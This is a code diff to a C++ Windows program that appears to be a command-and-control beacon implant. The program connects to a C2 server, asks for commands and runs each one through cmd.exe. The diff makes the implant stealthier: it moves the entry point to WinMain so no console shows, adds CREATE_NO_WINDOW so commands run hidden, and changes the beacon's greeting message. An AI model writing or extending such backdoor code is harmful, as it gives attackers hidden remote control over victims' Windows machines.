@@ -13,7 +13,8 @@ int beacon_to_c2(struct addrinfo* result, struct addrinfo* ptr, const char* send
 int send_message_to_c2(SOCKET ConnectSocket, const char* buffer);
 int execute_command(const char* cmd, SOCKET ConnectSocket);
 
-int main(int argc, char const* argv[]) 
+//int main(int argc, char const* argv[]) 
+int WINAPI WinMain(HINSTANCE inst, HINSTANCE prev, LPSTR cmd, int show)
 {
 	WSADATA wsaData;
 
@@ -43,7 +44,7 @@ int main(int argc, char const* argv[])
 
 	ptr = result;
 
-	const char sendbuf[] = "this is a test\0";
+	const char sendbuf[] = "Hey, I'm the beacon! Pretty poggers if you ask me. Gimme command pls:\0";
 
 	/*iResult = shutdown(ConnectSocket, SD_SEND);
 	if (iResult == SOCKET_ERROR)
@@ -180,18 +181,6 @@ int execute_command(const char* cmd, SOCKET ConnectSocket)
 	std::string fCmd = "C:\\Windows\\System32\\cmd.exe /c ";
 	fCmd.append(cmd);
 	LPSTR aCmd = const_cast<char*>(fCmd.c_str());
-	//fCmd = ;
-	//strcpy(fCmd, "C:\\Windows\\System32\\cmd.exe /k ");
-	//strcpy(&fCmd[32], cmd);
-	//TCHAR* cmdLine = (TCHAR*)malloc(cmdBufLen * sizeof(TCHAR));
-	/*int nChars = MultiByteToWideChar(CP_ACP, 0, fCmd, -1, NULL, 0);
-	wchar_t* wCmd = new WCHAR[nChars];
-	MultiByteToWideChar(CP_ACP, 0, fCmd, -1, (LPWSTR)wCmd, nChars);*/
-	/*std::wstring wFCmd = std::wstring(fCmd.begin(), fCmd.end());
-	const wchar_t* wCmd = wFCmd.c_str();*/
-	//printf("Precopy command: ")
-	//printf("Running command: %s\n", fCmd.c_str());
-	//TCHAR cmdLine[] = TEXT("C:\\Windows\\System32\\cmd.exe /c whoami");
 	PROCESS_INFORMATION pi;
 	STARTUPINFO si;
 	BOOL bSuccess = FALSE;
@@ -211,7 +200,7 @@ int execute_command(const char* cmd, SOCKET ConnectSocket)
 		NULL,
 		NULL,
 		TRUE,
-		0,
+		CREATE_NO_WINDOW,
 		NULL,
 		NULL,
 		(LPSTARTUPINFOA)&si,
